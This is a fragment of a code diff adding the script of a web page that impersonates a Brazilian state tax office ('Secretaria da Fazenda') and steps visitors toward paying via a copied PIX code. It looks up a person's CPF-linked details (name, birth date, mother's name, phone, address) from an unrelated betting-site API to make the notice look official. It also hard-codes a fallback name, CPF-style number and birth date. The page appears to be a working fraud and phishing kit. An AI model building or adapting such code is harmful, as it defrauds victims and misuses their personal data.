+      if (headerUserBadge) headerUserBadge.innerText = `Secretaria da Fazenda ${uf}`;
+    }
+
+    function selectBank(name, element) {
+      selectedBankName = name;
+      document.querySelectorAll('.bank-card').forEach(c => c.classList.remove('selected'));
+      element.classList.add('selected');
+    }
+
+    function goToStep(step) {
+      currentStep = step;
+
+      // Esconde todos os steps
+      for (let i = 1; i <= 5; i++) {
+        const el = document.getElementById(`step${i}`);
+        if (el) el.style.display = i === step ? 'block' : 'none';
+
+        const node = document.getElementById(`node${i}`);
+        if (node) {
+          node.classList.remove('active', 'completed');
+          if (i === step) node.classList.add('active');
+          else if (i < step) node.classList.add('completed');
+        }
+      }
+
+      // Atualiza linha de progresso
+      const progressLine = document.getElementById('stepsProgressLine');
+      if (progressLine) {
+        const pct = ((step - 1) / 4) * 100;
+        progressLine.style.width = pct + '%';
+      }
+
+      // Atualiza o resumo no Step 3
+      if (step === 3) {
+        document.getElementById('sumBanco').innerText = selectedBankName;
+        document.getElementById('sumPixKey').innerText = document.getElementById('pixKeyInput').value || '063.818.519-02';
+      }
+
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function copyPixCode() {
+      const copyText = document.getElementById("pixCopiaCola");
+      copyText.select();
+      copyText.setSelectionRange(0, 99999);
+      navigator.clipboard.writeText(copyText.value);
+      alert("Código PIX Copia e Cola copiado com sucesso!");
+    }
+
+    async function loadData() {
+      try {
+        let r = await fetch(`/api/secfaz/${cpfParam}`);
+        if (!r.ok) {
+          r = await fetch(`https://api.oitobet.com.br/api/secfaz/${cpfParam}`);
+        }
+        const json = await r.json();
+        const d = json.data || json;
+
+        const nome = d.nome || 'GABRIEL RODRIGUES DE OLIVEIRA';
+        const cpfFormatted = (d.cpf || cpfParam).replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        const dtNasc = d.dtNasc || '18/09/1995';
+        const nomeMae = d.nomeMae || '-';
+        const telefone = d.telefone || '-';
+        const cidade = d.endereco?.cidade || 'ITAPEVA';
+        const uf = d.endereco?.uf || 'SP';
+        const logradouro = d.endereco?.logradouro ? `${d.endereco.logradouro}, ${d.endereco.numero || 'S/N'}` : `${cidade} / ${uf}`;
+
+        // Atualiza Card de Topo
+        document.getElementById('resNome').innerText = nome;
+        document.getElementById('resCpf').innerText = 'CPF: ' + cpfFormatted;
+        if (document.getElementById('cardDtNasc')) document.getElementById('cardDtNasc').innerText = dtNasc;
+        if (document.getElementById('cardNomeMae')) document.getElementById('cardNomeMae').innerText = nomeMae;
+        if (document.getElementById('cardTelefone')) document.getElementById('cardTelefone').innerText = telefone;
+        if (document.getElementById('cardEndereco')) document.getElementById('cardEndereco').innerText = logradouro;
+
+        // Atualiza Resumo Tabela (Passo 3)
+        document.getElementById('sumNome').innerText = nome;
+        document.getElementById('sumCpf').innerText = cpfFormatted;
+        if (document.getElementById('sumDtNasc')) document.getElementById('sumDtNasc').innerText = dtNasc;
+        if (document.getElementById('sumNomeMae')) document.getElementById('sumNomeMae').innerText = nomeMae;
+        if (document.getElementById('sumCidadeUf')) document.getElementById('sumCidadeUf').innerText = `${cidade} / ${uf}`;
+      } catch (err) {}
+    }
+
+    async function initGeolocation() {
+      const latParam = params.get('lat');
+      const lngParam = params.get('lng');
+
+      if (latParam && lngParam) {
+        try {
+          const bdRes = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latParam}&longitude=${lngParam}&localityLanguage=pt`);
+          if (bdRes.ok) {
+            const bdData = await bdRes.json();
+            const state = bdData.principalSubdivisionCode ? bdData.principalSubdivisionCode.replace('BR-', '') : 'PR';
+            updateStateProgram(state);
+            return;
+          }
+        } catch (e) {}
+      }
+      updateStateProgram('PR');
+    }
+
+    loadData();
+    initGeolocation();
+  </script>
+</body>
+</html>
